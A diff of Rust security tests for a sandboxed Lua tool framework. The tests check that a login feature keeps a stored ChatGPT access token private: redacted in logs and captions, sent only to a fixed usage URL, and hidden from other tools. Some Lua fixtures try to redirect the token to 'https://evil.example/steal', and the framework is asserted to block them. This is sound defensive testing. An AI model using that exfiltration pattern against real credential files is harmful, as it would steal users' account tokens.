@@ -1863,3 +1863,390 @@ end
         note.text == "未授权" && !note.text.contains("12.5") && !note.text.contains(&token)
     }));
 }
+
+fn write_login_file(home: &Path, token: &str, account: &str) {
+    let dir = home.join(".codex");
+    std::fs::create_dir_all(&dir).unwrap();
+    std::fs::write(
+        dir.join("auth.json"),
+        format!(r#"{{"tokens":{{"access_token":"{token}","account_id":"{account}"}}}}"#),
+    )
+    .unwrap();
+}
+
+fn open_generic(dir: &Path, transport: Arc<Recorded>, home: &Path) -> Session {
+    crate::guide::write_example(dir, "chatgpt-generic").unwrap();
+    let mut options = Options::default();
+    options.transport = transport;
+    options.login_roots = Some(crate::login::LoginRoots {
+        home: Some(home.to_path_buf()),
+    });
+    let session = open_at(dir, options).unwrap();
+    session.on_load();
+    session
+}
+
+#[test]
+fn generic_chatgpt_login_hides_the_file_and_caches_per_tool() {
+    crate::login::reset_login_cache_for_test();
+    let token = future_access_token();
+    let account = "acct-leak-9f3a";
+    let dir = Scratch::new("login-generic");
+    let home = dir.join("home");
+    write_login_file(&home, &token, account);
+    let transport = Arc::new(Recorded {
+        log: Mutex::new(Vec::new()),
+        status: 200,
+        body: usage_body(),
+    });
+    let session = open_generic(&dir, transport.clone(), &home);
+    assert_eq!(caption(&session, "five"), "5小时 12.5% · 01-01 00:00");
+    assert_eq!(caption(&session, "week"), "每周 40% · 01-08 00:00");
+    let sent = transport.log.lock().unwrap().clone();
+    assert_eq!(sent.len(), 1);
+    assert_eq!(sent[0].method, "GET");
+    assert_eq!(sent[0].url, crate::usage::CHATGPT_USAGE_URL);
+    assert!(sent[0].body.is_empty());
+    assert_eq!(
+        sent[0].headers,
+        vec![
+            ("Accept".to_string(), "application/json".to_string(),),
+            ("Authorization".to_string(), format!("Bearer {token}")),
+            ("ChatGPT-Account-Id".to_string(), account.to_string()),
+        ]
+    );
+    let debug = format!("{:?}", sent[0]);
+    assert!(debug.contains("<redacted>"), "{debug}");
+    assert!(!debug.contains(&token), "{debug}");
+    assert!(!debug.contains(account), "{debug}");
+    for text in [caption(&session, "five"), caption(&session, "week")] {
+        assert!(!text.contains(&token), "{text}");
+        assert!(!text.contains(account), "{text}");
+        assert!(!text.contains("chatgpt.com"), "{text}");
+    }
+    assert!(
+        session
+            .notices()
+            .iter()
+            .all(|note| { !note.text.contains(&token) && !note.text.contains(account) })
+    );
+    session.advance(300.0);
+    assert_eq!(session.http_sends(), 1);
+    assert_eq!(transport.log.lock().unwrap().len(), 1);
+    crate::login::age_login_cache_for_test(Duration::from_secs(61));
+    session.advance(300.0);
+    assert_eq!(session.http_sends(), 2);
+
+    crate::login::reset_login_cache_for_test();
+    let denied = Scratch::new("login-401");
+    let home = denied.join("home");
+    write_login_file(&home, &token, account);
+    let transport = Arc::new(Recorded {
+        log: Mutex::new(Vec::new()),
+        status: 401,
+        body: token.clone(),
+    });
+    let session = open_generic(&denied, transport, &home);
+    assert_eq!(caption(&session, "five"), "登录已过期");
+    assert!(!caption(&session, "five").contains(&token));
+    assert!(
+        session
+            .notices()
+            .iter()
+            .all(|note| { note.text == "登录已过期" && !note.text.contains(&token) })
+    );
+
+    crate::login::reset_login_cache_for_test();
+    let missing = Scratch::new("login-missing");
+    let home = missing.join("home");
+    std::fs::create_dir_all(home.join(".codex")).unwrap();
+    let transport = recorded(&token);
+    let session = open_generic(&missing, transport.clone(), &home);
+    assert_eq!(caption(&session, "five"), "登录已过期");
+    assert!(transport.log.lock().unwrap().is_empty());
+    assert_eq!(session.http_sends(), 0);
+
+    crate::login::reset_login_cache_for_test();
+    let redirected = Scratch::new("login-redirect");
+    let home = redirected.join("home");
+    write_login_file(&home, &token, account);
+    let transport = Arc::new(Recorded {
+        log: Mutex::new(Vec::new()),
+        status: 302,
+        body: format!("https://evil.example/next {token}"),
+    });
+    let session = open_generic(&redirected, transport.clone(), &home);
+    assert_eq!(caption(&session, "five"), "请求失败");
+    assert_eq!(transport.log.lock().unwrap().len(), 1);
+    assert!(!caption(&session, "five").contains(&token));
+    assert!(!caption(&session, "five").contains("evil.example"));
+}
+
+#[test]
+fn login_fetch_cannot_change_the_request_or_read_another_tools_cache() {
+    crate::login::reset_login_cache_for_test();
+    let token = future_access_token();
+    let account = "acct-leak-9f3a";
+    let owner = Scratch::new("login-owner");
+    let home = owner.join("home");
+    write_login_file(&home, &token, account);
+    let transport = Arc::new(Recorded {
+        log: Mutex::new(Vec::new()),
+        status: 200,
+        body: usage_body(),
+    });
+    let mut options = Options::default();
+    options.transport = transport.clone();
+    options.login_roots = Some(crate::login::LoginRoots { home: Some(home) });
+    crate::guide::write_example(&owner, "chatgpt-generic").unwrap();
+    let script = r#"
+function on_load()
+  login.fetch("chatgpt", function(result)
+    ui.text("five", result.error or "ok")
+  end, "https://evil.example/steal")
+end
+"#;
+    std::fs::write(owner.join("main.lua"), script).unwrap();
+    let session = open_at(&owner, options).unwrap();
+    session.on_load();
+    let sent = transport.log.lock().unwrap().clone();
+    assert_eq!(sent.len(), 1);
+    assert_eq!(sent[0].url, crate::usage::CHATGPT_USAGE_URL);
+    assert_eq!(sent[0].method, "GET");
+    assert!(sent[0].body.is_empty());
+    assert!(!format!("{:?}", sent[0]).contains(&token));
+
+    let blocked = Scratch::new("login-blocked");
+    let home = blocked.join("home");
+    write_login_file(&home, &token, account);
+    let transport = recorded(&usage_body());
+    let mut options = Options::default();
+    options.transport = transport.clone();
+    options.login_roots = Some(crate::login::LoginRoots {
+        home: Some(home.clone()),
+    });
+    crate::guide::write_example(&blocked, "chatgpt-generic").unwrap();
+    std::fs::write(
+        blocked.join("main.lua"),
+        r#"
+function on_load()
+  local ok = pcall(function()
+    login.fetch("chatgpt", "https://evil.example/steal", function() end)
+  end)
+  ui.text("five", ok and "sent" or "blocked")
+end
+"#,
+    )
+    .unwrap();
+    let session = open_at(&blocked, options).unwrap();
+    session.on_load();
+    assert_eq!(caption(&session, "five"), "blocked");
+    assert!(transport.log.lock().unwrap().is_empty());
+    assert_eq!(session.http_sends(), 0);
+    assert!(!caption(&session, "five").contains(&token));
+
+    let other = Scratch::new("login-other");
+    write_tool(
+        &other,
+        &tool(
+            "example.other",
+            "\"http\", \"storage\"",
+            r#"
+[http]
+domains = ["chatgpt.com"]
+
+[[login]]
+id = "chatgpt"
+label = "登录"
+file = "notes/missing.json"
+
+[[login.fields]]
+name = "token"
+path = "token"
+header = "Authorization"
+prefix = "Bearer "
+
+[login.request]
+method = "GET"
+url = "https://chatgpt.com/backend-api/wham/usage"
+
+[[login.extract]]
+name = "note"
+path = "note"
+type = "string"
+"#,
+            &text_widgets(&["out"]),
+        ),
+        r#"
+function on_load()
+  login.fetch("chatgpt", function(result)
+    local text = result.error or ""
+    if result.values and result.values.note then
+      text = text .. result.values.note
+    end
+    storage.set("seen", text)
+    ui.text("out", text)
+  end)
+end
+"#,
+    );
+    let saved = Rc::new(RefCell::new(
+        std::collections::BTreeMap::<String, String>::new(),
+    ));
+    let saved_cb = Rc::clone(&saved);
+    let transport = recorded(r#"{"note":"should-not-appear"}"#);
+    let mut options = Options::default();
+    options.transport = transport.clone();
+    options.login_roots = Some(crate::login::LoginRoots { home: Some(home) });
+    options.persist_storage = Some(Rc::new(move |entries| {
+        *saved_cb.borrow_mut() = entries.clone();
+        Ok(())
+    }));
+    let session = open_at(&other, options).unwrap();
+    session.on_load();
+    assert_eq!(caption(&session, "out"), "登录已过期");
+    assert!(!caption(&session, "out").contains("12.5"));
+    assert!(!caption(&session, "out").contains("should-not-appear"));
+    assert!(!caption(&session, "out").contains(&token));
+    assert!(transport.log.lock().unwrap().is_empty());
+    let stored = saved.borrow().clone();
+    assert!(stored.values().all(|value| !value.contains(&token)));
+    assert!(stored.values().all(|value| !value.contains("12.5")));
+
+    let stranger = Scratch::new("login-stranger");
+    write_tool(
+        &stranger,
+        &tool(
+            "example.stranger",
+            "\"http\"",
+            r#"
+[http]
+domains = ["chatgpt.com"]
+
+[[login]]
+id = "other"
+label = "别的"
+file = "notes/auth.json"
+
+[[login.fields]]
+name = "token"
+path = "token"
+header = "Authorization"
+
+[login.request]
+method = "GET"
+url = "https://chatgpt.com/backend-api/wham/usage"
+
+[[login.extract]]
+name = "note"
+path = "note"
+type = "string"
+"#,
+            &text_widgets(&["out"]),
+        ),
+        r#"
+function on_load()
+  login.fetch("chatgpt", function(result)
+    local text = result.error or ""
+    if result.values and result.values.note then
+      text = text .. result.values.note
+    end
+    ui.text("out", text)
+  end)
+end
+"#,
+    );
+    let transport = recorded(r#"{"note":"leaked"}"#);
+    let mut options = Options::default();
+    options.transport = transport.clone();
+    let session = open_at(&stranger, options).unwrap();
+    session.on_load();
+    assert_eq!(caption(&session, "out"), "未授权");
+    assert!(transport.log.lock().unwrap().is_empty());
+    assert!(!caption(&session, "out").contains(&token));
+    assert!(session.notices().iter().all(|note| note.text == "未授权"));
+}
+
+#[test]
+fn login_extract_rejects_a_string_that_contains_the_file_secret() {
+    crate::login::reset_login_cache_for_test();
+    let token = future_access_token();
+    let dir = Scratch::new("login-echo");
+    let home = dir.join("home");
+    std::fs::create_dir_all(home.join("notes")).unwrap();
+    std::fs::write(
+        home.join("notes").join("auth.json"),
+        format!(r#"{{"token":"{token}"}}"#),
+    )
+    .unwrap();
+    write_tool(
+        &dir,
+        &tool(
+            "example.echo",
+            "\"http\"",
+            r#"
+[http]
+domains = ["chatgpt.com"]
+
+[[login]]
+id = "chatgpt"
+label = "登录"
+file = "notes/auth.json"
+
+[[login.fields]]
+name = "token"
+path = "token"
+header = "Authorization"
+prefix = "Bearer "
+
+[login.expires]
+field = "token"
+format = "jwt_exp"
+
+[login.request]
+method = "GET"
+url = "https://chatgpt.com/backend-api/wham/usage"
+
+[[login.extract]]
+name = "note"
+path = "note"
+type = "string"
+"#,
+            &text_widgets(&["out"]),
+        ),
+        r#"
+function on_load()
+  login.fetch("chatgpt", function(result)
+    local text = result.error or ""
+    if result.values then
+      for key, value in pairs(result.values) do
+        text = text .. key .. tostring(value)
+      end
+    end
+    ui.text("out", text)
+  end)
+end
+"#,
+    );
+    let transport = Arc::new(Recorded {
+        log: Mutex::new(Vec::new()),
+        status: 200,
+        body: format!(r#"{{"note":"seen {token} tail","plan_type":"plus"}}"#),
+    });
+    let mut options = Options::default();
+    options.transport = transport.clone();
+    options.login_roots = Some(crate::login::LoginRoots { home: Some(home) });
+    let session = open_at(&dir, options).unwrap();
+    session.on_load();
+    assert_eq!(caption(&session, "out"), "数据无效");
+    assert!(!caption(&session, "out").contains(&token));
+    assert!(!caption(&session, "out").contains("plan_type"));
+    assert!(
+        session
+            .notices()
+            .iter()
+            .all(|note| { note.text == "数据无效" && !note.text.contains(&token) })
+    );
+    let debug = format!("{:?}", transport.log.lock().unwrap()[0]);
+    assert!(!debug.contains(&token), "{debug}");
+}
